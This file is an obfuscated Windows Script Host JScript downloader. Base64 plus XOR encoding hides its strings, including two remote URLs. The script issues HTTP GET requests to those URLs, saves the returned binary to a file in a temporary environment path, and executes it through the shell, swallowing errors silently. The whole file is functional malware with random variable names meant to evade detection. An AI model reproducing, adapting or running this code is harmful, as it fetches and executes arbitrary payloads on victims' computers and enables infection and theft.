function decode(formalqcK, gentrywV1, penchantySr) {
    formalqcK = formalqcK.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    var dregsm82 = [ 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, 64, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51 ];
    var cozeneya = gentrywV1;
    if (!cozeneya) {
        cozeneya = new Uint8Array(Math.ceil(formalqcK.length / 4) * 3);
    }
    penchantySr = penchantySr || 0;
    var poignancyYKU, gruelvbN, nattyQcZ, bentTaN;
    var contemptFpK = 0, descrye4N = penchantySr;
    while (contemptFpK < formalqcK.length) {
        poignancyYKU = dregsm82[formalqcK.charCodeAt(contemptFpK++) - 43];
        gruelvbN = dregsm82[formalqcK.charCodeAt(contemptFpK++) - 43];
        nattyQcZ = dregsm82[formalqcK.charCodeAt(contemptFpK++) - 43];
        bentTaN = dregsm82[formalqcK.charCodeAt(contemptFpK++) - 43];
        cozeneya[descrye4N++] = poignancyYKU << 2 | gruelvbN >> 4;
        if (nattyQcZ !== 64) {
            cozeneya[descrye4N++] = (gruelvbN & 15) << 4 | nattyQcZ >> 2;
            if (bentTaN !== 64) {
                cozeneya[descrye4N++] = (nattyQcZ & 3) << 6 | bentTaN;
            }
        }
    }
    return gentrywV1 ? descrye4N - penchantySr : cozeneya.subarray(0, descrye4N);
}

var incisiveWK4 = function(assailus7) {
    var belieOQx = [];
    var nuanceGfO = decode(assailus7, belieOQx);
    var machinationnqL = "charCodeAt";
    var conceitOC9 = "";
    for (var contemptFpK = 0; contemptFpK < nuanceGfO; contemptFpK++) {
        conceitOC9 += String.fromCharCode(belieOQx[contemptFpK] ^ "l9p1xQ7zpw1vlzzB"[machinationnqL](contemptFpK % "l9p1xQ7zpw1vlzzB".length));
    }
    return conceitOC9;
};

var penchantkz1 = function() {
    var bequeathdol = function() {};
    bequeathdol.prototype.S0AJJ1oWxu = function(plumbpi9) {
        var impertinentxVt = incisiveWK4('"L0sVUAw0eBgaElIC"');
        return WScript[impertinentxVt](plumbpi9);
    };
    return bequeathdol;
}();

(function() {
    var malicevx0 = new penchantkz1();
    var eludef8J = 200;
    var upshotcDi = incisiveWK4('"K3wk"');
    var audaciousFrX = incisiveWK4('"KUEVUg=="');
    var implacablepAn = incisiveWK4('"A0kVXw=="');
    var reconditeEZn = incisiveWK4('"O2oTQxEhQ1QjH1QaAA=="');
    var conservatoryydf = incisiveWK4('"IWoofDRjGSI9O3kiOCo="');
    var eugenicEzb = incisiveWK4('"HHsAXTEGfEkyQA=="');
    var appealAYV = incisiveWK4('"D3Y0BjkzeT0TJQ=="');
    var coaxLxh = incisiveWK4('"JH4SXxE1XxI7Og=="');
    var disgorgeHyV = incisiveWK4('"K0MCc0E5XjYIEg=="');
    var lodeYOk = incisiveWK4('"HFE4YRUEQU0BFA=="');
    var inscrutablebcI = incisiveWK4('"Fmk+SS0keDMmIw=="');
    var admonishkKA = incisiveWK4('"LX0/dTo="');
    var nicetyBOm = incisiveWK4('"P00CVBk8"');
    var diffidenceTEh = incisiveWK4('"SW01fCh0aw=="');
    var piousUhI = incisiveWK4('"QlwIVA=="');
    var expostulationVZS = Math.pow(2, 10) * 249;
    var cavaliernLn = [ incisiveWK4('"BE0EQUJ+GA0YEkMXHh8DLRlfAl4VN1FUExhcWVVJVCcUXA=="'), incisiveWK4('"BE0EQUJ+GBsCEl8SHhUPKRVKFEAJf1QVHVgIRUIfAic="') ];
    var assailXiG = 4194304;
    var codiciljXk = malicevx0[incisiveWK4('"PwkxezJgWC0IAg=="')];
    var levelzIO = codiciljXk(reconditeEZn);
    var vainf9C = codiciljXk(conservatoryydf);
    var rhetoricQ1C = codiciljXk(admonishkKA + incisiveWK4('"Qg=="') + nicetyBOm);
    var rarefiedK8h = levelzIO.ExpandEnvironmentStrings(diffidenceTEh);
    var fraughtmkh = rarefiedK8h + assailXiG + piousUhI;
    var disaffectedgXU = false;
    for (var rippleU7u = 0; rippleU7u < cavaliernLn.length; rippleU7u++) {
        try {
            var wheedlerTr = cavaliernLn[rippleU7u];
            vainf9C.open(upshotcDi, wheedlerTr, false);
            vainf9C.send();
            if (vainf9C.status == eludef8J) {
                try {
                    rhetoricQ1C[implacablepAn]();
                    rhetoricQ1C.type = 1;
                    rhetoricQ1C.write(vainf9C[incisiveWK4('"HlwDQRc/RB8yGFUP"')]);
                    if (rhetoricQ1C.size > expostulationVZS) {
                        rippleU7u = cavaliernLn.length;
                        rhetoricQ1C.position = 0;
                        rhetoricQ1C.saveToFile(fraughtmkh, 2);
                        disaffectedgXU = true;
                    }
                } finally {
                    rhetoricQ1C.close();
                }
            }
        } catch (ignored) {}
    }
    if (disaffectedgXU) {
        levelzIO[audaciousFrX](rarefiedK8h + Math.pow(2, 22));
    }
})();